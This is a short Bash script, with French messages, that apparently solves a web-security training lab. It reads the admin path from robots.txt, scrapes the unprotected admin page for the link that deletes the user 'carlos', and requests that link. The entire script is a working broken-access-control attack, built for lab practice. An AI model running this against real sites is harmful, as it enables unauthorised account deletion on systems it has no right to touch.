#!/bin/bash

# Usage: ./unprotected_admin.sh <LAB_URL>
if [ $# -ne 1 ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"

echo "[*] Recherche du chemin admin dans robots.txt..."
admin_path=$(curl -sk "$LAB_URL/robots.txt" | grep -i '^Disallow:' | awk '{print $2}' | tr -d '\r\n')

if [ -z "$admin_path" ]; then
    echo "[-] Chemin admin non trouvé dans robots.txt"
    exit 1
fi

echo "[+] Chemin admin trouvé : $admin_path"

echo "[*] Recherche du lien de suppression pour carlos..."
admin_page=$(curl -sk "$LAB_URL$admin_path")

# Extraction du lien de suppression sans grep -P
delete_link=$(echo "$admin_page" | grep -Eo 'href="[^"]*delete\?username=carlos[^"]*"' | head -n1 | awk -F'"' '{print $2}')

if [ -z "$delete_link" ]; then
    echo "[-] Lien de suppression pour carlos non trouvé."
    exit 1
fi

echo "[+] Lien de suppression trouvé : $delete_link"

echo "[*] Suppression de l'utilisateur carlos..."
curl -sk "$LAB_URL$delete_link" -o /dev/null

echo "[+] Requête envoyée. Vérifiez l'interface du lab pour la validation."
